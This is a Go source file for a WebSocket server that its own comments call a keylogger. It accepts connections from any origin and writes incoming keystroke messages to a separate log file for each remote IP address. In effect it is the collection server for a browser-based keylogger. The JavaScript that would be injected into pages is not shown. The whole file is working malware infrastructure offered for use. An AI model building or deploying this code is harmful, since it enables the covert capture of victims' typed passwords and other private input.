package main

import (
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/gorilla/websocket"
)

const logfileSuf = "logger.txt"

// KeyFileBufWriter keylogger 文件与写入缓存器
type KeyFileBufWriter struct {
	storeFile *os.File
	keyBuf    *bufio.Writer
}

var keyFileBufSet = make(map[string]*KeyFileBufWriter)
var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

func clean() {
	for _, fbw := range keyFileBufSet {
		fbw.keyBuf.Flush()
		fbw.storeFile.Close()
	}
}

func cleanCurrentConn(address string) {
	fbw, ok := keyFileBufSet[address]
	if ok {
		fbw.keyBuf.Flush()
		fbw.storeFile.Close()
	}

}

func keylogger(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("upgrade:", err)
		return
	}
	address := strings.Split(conn.RemoteAddr().String(), ":")[0]

	defer func() {
		conn.Close()
		cleanCurrentConn(address)
	}()

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			log.Println("read:", err)
			break
		}
		err = storekey(address, string(msg))
		if err != nil {
			log.Fatalln("storeKey:", err)
			break
		}
	}
}

// storekey 按照addsress写入文件 以鼠标点击和回车分隔（换行）写入文件
func storekey(address, key string) (err error) {
	fbw, ok := keyFileBufSet[address]
	if !ok {
		newfile := fmt.Sprintf("%s_%s", address, logfileSuf)
		f, err := os.OpenFile(newfile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0666)
		if err != nil {
			return err
		}
		bw := bufio.NewWriter(f)
		fbw = &KeyFileBufWriter{f, bw}
		keyFileBufSet[address] = fbw
	}
	_, err = fbw.keyBuf.WriteString(key)
	if err != nil {
		log.Fatalln("storeKey:", err)
	}
	return
}

func main() {
	defer clean()
	log.SetFlags(0)
	log.Println("ws://0.0.0.0:5000/ws")
	http.HandleFunc("/ws", keylogger)
	log.Fatal(http.ListenAndServe(":5000", nil))
}
